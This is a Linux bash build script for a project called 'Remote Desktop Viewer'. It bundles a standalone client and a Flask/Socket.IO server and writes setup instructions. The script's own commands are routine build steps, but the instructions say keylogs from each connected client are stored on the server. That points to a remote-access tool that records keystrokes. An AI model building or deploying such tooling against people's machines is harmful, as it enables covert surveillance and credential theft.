#!/bin/bash
# Build script for Linux

echo "Building Remote Desktop Viewer for Linux..."

# Install dependencies
echo "Installing dependencies..."
pip3 install -r requirements.txt

# Install PyInstaller
pip3 install pyinstaller

# Build client as single file
echo "Building client (single file)..."
pyinstaller --noconfirm client.spec
if [ $? -ne 0 ]; then
    echo "Client build failed!"
    exit 1
fi

# Create server directory and copy Python files
echo "Setting up server (Python scripts)..."
mkdir -p dist/server
cp server/*.py dist/server/
cp -r server/templates dist/server/
cp -r server/static dist/server/
cp -r common dist/server/
cp config.py dist/server/

# Create server requirements.txt
cat > dist/server/requirements.txt << 'EOF'
# Server dependencies
Flask>=3.0.0
flask-socketio>=5.3.0
eventlet>=0.33.0
cryptography>=41.0.0
Pillow>=10.0.0
EOF

# Fix imports in server files
sed -i "s/sys\.path\.insert(0, str(Path(__file__)\.parent\.parent))/sys.path.insert(0, str(Path(__file__).parent))/g" dist/server/server.py
sed -i "s/sys\.path\.insert(0, str(Path(__file__)\.parent\.parent))/sys.path.insert(0, str(Path(__file__).parent))/g" dist/server/web_server.py
sed -i "s/from server\.web_server import/from web_server import/g" dist/server/server.py

# Create shell script to run server
cat > dist/server/run_server.sh << 'EOF'
#!/bin/bash
python3 server.py --web --web-port 5000
EOF
chmod +x dist/server/run_server.sh

# Create setup instructions
cat > dist/server/SETUP.txt << 'EOF'
SERVER SETUP INSTRUCTIONS
=========================

The server runs as Python scripts (not a single file).

REQUIREMENTS:
- Python 3.8 or higher installed
- Internet connection (for installing dependencies)

SETUP STEPS:
1. Open terminal in this directory (dist/server)
2. Install dependencies:
   pip3 install -r requirements.txt

3. Run the server:
   python3 server.py --web --web-port 5000
   
   OR: ./run_server.sh

4. Open web browser:
   http://localhost:5000

USAGE:
- Server listens on port 8443 for client connections (SSL/TLS)
- Web interface runs on port 5000 (or custom port with --web-port)
- Keylogs are saved in: keylogs/[ClientName]/

TROUBLESHOOTING:
- If you get "ModuleNotFoundError", run: pip3 install -r requirements.txt
- If port 5000 is in use, change it: python3 server.py --web --web-port 8000
- Make sure Python 3 is installed
EOF

echo ""
echo "========================================"
echo "Build complete!"
echo "========================================"
echo ""
echo "CLIENT (Single File):"
echo "  - dist/client"
echo ""
echo "SERVER (Python - requires Python installed):"
echo "  - dist/server/"
echo "  - Run: cd dist/server && python3 server.py --web --web-port 5000"
echo "  - Or: ./dist/server/run_server.sh"
echo ""
echo "USAGE:"
echo "  Server: cd dist/server && python3 server.py --web --web-port 5000"
echo "  Client: ./dist/client --server-host SERVER_IP --server-port 8443"
echo "  Web UI: http://localhost:5000"
echo ""
